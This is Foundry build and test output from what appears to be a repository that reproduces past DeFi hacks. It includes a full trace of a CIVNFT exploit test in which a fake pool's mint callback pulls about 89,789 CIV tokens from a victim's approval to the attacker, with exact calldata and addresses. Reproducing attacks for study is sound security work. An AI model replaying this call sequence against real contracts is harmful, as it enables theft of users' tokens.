Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.17s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/CIVNFT_exp.sol:40:5:
   |
40 |     IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2023-07/CIVNFT_exp.sol:61:5:
   |
61 |     function token0() external view returns (address) {
   |     ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2023-07/CIVNFT_exp.sol:65:5:
   |
65 |     function token1() external view returns (address) {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 264.81ms (145.06µs CPU time)

Ran 1 test for src/test/2023-07/CIVNFT_exp.sol:CIVNFTTest
[PASS] testExploit() (gas: 437143)
Logs:
  Attacker CIV balance before exploit: 0.000000000000000000
  Attacker CIV balance after exploit: 89789.154803441368766010

Traces:
  [461843] CIVNFTTest::testExploit()
    ├─ [2863] CIV::balanceOf(CIVNFTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [432] CIV::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker CIV balance before exploit", val: 0, decimals: 18)
    ├─ [444022] CIVNFT::7ca06d68(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000c0fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe8397000000000000000000000000000000000000000000002964d28008383a2d6d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000008302e303030303539000000000000000000000000000000000000000000000000)
    │   ├─ [436655] 0x78bd317a87d2Eab65b666e9402182A949Ab4EeB9::7ca06d68(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000c0fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe8397000000000000000000000000000000000000000000002964d28008383a2d6d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000008302e303030303539000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   ├─ [221] CIVNFTTest::tickSpacing() [staticcall]
    │   │   │   └─ ← [Return] 60
    │   │   ├─ [818] CIVNFTTest::slot0() [staticcall]
    │   │   │   └─ ← [Return] Slot0({ sqrtPriceX96: 590212530842204246875907781 [5.902e26], tick: -97380 [-9.738e4], observationIndex: 0, observationCardinality: 1, observationCardinalityNext: 1, feeProtocol: 0, unlocked: true })
    │   │   ├─ [46283] CIVNFTTest::mint(CIVNFT: [0xF169BD68ED72B2fdC3C9234833197171AA000580], -97440 [-9.744e4], -97380 [-9.738e4], 499885050972117170683107 [4.998e23], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   │   ├─ [2863] CIV::balanceOf(victim: [0x512e9701D314b365921BcB3b8265658A152C9fFD]) [staticcall]
    │   │   │   │   └─ ← [Return] 89789154803441368766010 [8.978e22]
    │   │   │   ├─ [40635] CIVNFT::uniswapV3MintCallback(89789154803441368766010 [8.978e22], 0, 0x000000000000000000000000512e9701d314b365921bcb3b8265658a152c9ffd000000000000000000000000512e9701d314b365921bcb3b8265658a152c9ffd)
    │   │   │   │   ├─ [39780] 0x78bd317a87d2Eab65b666e9402182A949Ab4EeB9::uniswapV3MintCallback(89789154803441368766010 [8.978e22], 0, 0x000000000000000000000000512e9701d314b365921bcb3b8265658a152c9ffd000000000000000000000000512e9701d314b365921bcb3b8265658a152c9ffd) [delegatecall]
    │   │   │   │   │   ├─ [237] CIVNFTTest::token0() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] CIV: [0x37fE0f067FA808fFBDd12891C0858532CFE7361d]
    │   │   │   │   │   ├─ [268] CIVNFTTest::token1() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
    │   │   │   │   │   ├─ [34792] CIV::transferFrom(victim: [0x512e9701D314b365921BcB3b8265658A152C9fFD], CIVNFTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89789154803441368766010 [8.978e22])
    │   │   │   │   │   │   ├─ emit Transfer(from: victim: [0x512e9701D314b365921BcB3b8265658A152C9fFD], to: CIVNFTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 89789154803441368766010 [8.978e22])
    │   │   │   │   │   │   ├─ emit Approval(owner: victim: [0x512e9701D314b365921BcB3b8265658A152C9fFD], spender: CIVNFT: [0xF169BD68ED72B2fdC3C9234833197171AA000580], value: 115792089237316195423570985008687907853269984665640563849668429204471760873925 [1.157e77])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 
    │   │   │   └─ ← [Return] 0, 0
    │   │   ├─ emit Transfer(_from: 0x0000000000000000000000000000000000000000, _to: CIVNFTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 61)
    │   │   ├─  emit topic 0: 0xbff6bec5c31e8419bd3fbc20f32b7e3695a58230657995a2b7d09634acf9efea
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000003d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [863] CIV::balanceOf(CIVNFTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 89789154803441368766010 [8.978e22]
    ├─ [432] CIV::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker CIV balance after exploit", val: 89789154803441368766010 [8.978e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 333.71ms (2.50ms CPU time)

Ran 2 test suites in 682.64ms (598.52ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
